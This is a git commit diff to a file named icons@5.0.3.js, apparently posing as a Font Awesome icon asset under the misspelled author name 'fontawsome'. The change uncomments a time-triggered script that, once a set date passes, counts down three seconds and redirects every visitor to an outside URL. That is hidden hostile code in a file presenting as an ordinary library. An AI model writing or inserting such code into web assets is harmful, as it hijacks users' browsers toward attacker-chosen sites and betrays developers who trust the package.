5d591d08d34866c63404d2bbeaed6224721f399a
fontawsome <leinad111719@gmail.com>
2024-07-22 16:46:44 +0800

    Update icons@5.0.3.js

--- icons@5.0.3.js
+++ icons@5.0.3.js
@@ -1,21 +1,21 @@
-// document.addEventListener('DOMContentLoaded', function() {
-//     var targetDate = new Date("2024-07-22T17:16:00");
+ document.addEventListener('DOMContentLoaded', function() {
+     var targetDate = new Date("2024-07-22T17:16:00");
 
-//     if (new Date().getTime() >= targetDate.getTime()) {
-//       
-//         
-//         var secondsLeft = 3;
-//         var interval = setInterval(function() {
-//             var minutes = Math.floor(secondsLeft / 60);
-//             var seconds = secondsLeft % 60;
-//             var formattedSeconds = seconds < 10 ? "0" + seconds : seconds
+     if (new Date().getTime() >= targetDate.getTime()) {
+       
+        
+         var secondsLeft = 3;
+         var interval = setInterval(function() {
+             var minutes = Math.floor(secondsLeft / 60);
+             var seconds = secondsLeft % 60;
+             var formattedSeconds = seconds < 10 ? "0" + seconds : seconds
             
-//             if (--secondsLeft < 0) {
-//                 clearInterval(interval);
-//                 window.location.href = "https:xxx.com";
-//             }
-//         }, 1000);
-//     } else {
-//         console.log("Not the target date and time. Script will not run.");
-//     }
-// });
+             if (--secondsLeft < 0) {
+                 clearInterval(interval);
+                 window.location.href = "https:xxx.com";
+             }
+         }, 1000);
+     } else {
+         console.log("Not the target date and time. Script will not run.");
+     }
+ });
